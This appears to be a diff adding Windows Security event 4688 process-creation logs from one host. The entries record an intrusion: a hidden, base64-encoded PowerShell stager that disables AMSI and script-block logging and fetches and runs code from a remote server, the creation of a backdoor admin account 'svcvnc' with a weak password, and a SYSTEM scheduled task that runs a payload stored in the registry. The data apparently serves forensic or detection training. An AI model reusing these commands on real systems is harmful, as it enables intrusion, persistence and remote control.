+	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:09:44.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x20d8
+	New Process Name:	C:\Windows\System32\schtasks.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\schtasks.exe"" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:08:35.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1d6c
+	New Process Name:	C:\Windows\System32\net.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\net.exe"" localgroup administrators svcvnc /add
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:08:17.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2648
+	New Process Name:	C:\Windows\System32\net.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\net.exe"" user /add svcvnc Password123!
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:07:06.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x18d8
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1124
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:07:06.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x23f8
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1124
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
